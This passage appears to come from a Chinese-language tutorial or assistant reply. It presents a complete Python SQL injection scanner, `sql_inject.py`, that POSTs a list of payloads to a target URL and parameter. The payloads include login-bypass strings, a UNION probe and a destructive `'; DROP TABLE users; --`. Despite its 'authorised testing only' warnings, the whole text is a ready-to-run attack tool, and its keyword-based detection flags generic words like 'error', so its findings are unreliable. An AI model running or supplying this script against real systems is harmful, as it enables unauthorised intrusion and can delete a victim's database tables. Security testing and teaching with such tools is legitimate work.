
---

### **2. 更新后的 `sql_inject.py`（直接替换原来的）**

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
庞子潇 - 简单SQL注入检测工具
仅用于授权的安全测试和学习
"""

import requests
import argparse

# 常见 SQL 注入 payload（已提取为常量，避免魔法值）
PAYLOADS = [
    "' OR '1'='1",                    # 万能密码绕过
    "' OR '1'='1' --",                # 单行注释
    "' OR '1'='1' #",                 # 另一种注释符
    "'; DROP TABLE users; --",        # 危险操作示例（测试用）
    "' UNION SELECT NULL, NULL --"    # 联合查询示例
]


def test_sql_injection(url: str, param: str) -> None:
    """测试指定 URL 是否存在 SQL 注入漏洞"""
    print(f"[+] 开始测试目标: {url}")
    print(f"[+] 测试参数: {param}\n")
    
    for payload in PAYLOADS:
        try:
            data = {param: payload}
            response = requests.post(url, data=data, timeout=5)
            content = response.text.lower()
            
            # 检测常见数据库错误关键词
            if any(keyword in content for keyword in ["sql", "mysql", "syntax", "error", "exception", "warning"]):
                print(f"[!] 可能存在 SQL 注入！Payload: {payload}")
                print(f"    返回长度: {len(response.text)}")
            else:
                print(f"[-] Payload 测试通过: {payload[:30]}...")
                
        except requests.exceptions.RequestException as e:
            print(f"[-] 请求异常: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="简单 SQL 注入检测工具 - 仅限授权测试使用")
    parser.add_argument("-u", "--url", required=True, help="目标 URL")
    parser.add_argument("-p", "--param", default="id", help="要测试的参数名称")
    args = parser.parse_args()
    
    # 安全警告
    print("⚠️  警告：请确保您有目标系统的授权！\n")
    test_sql_injection(args.url, args.param)
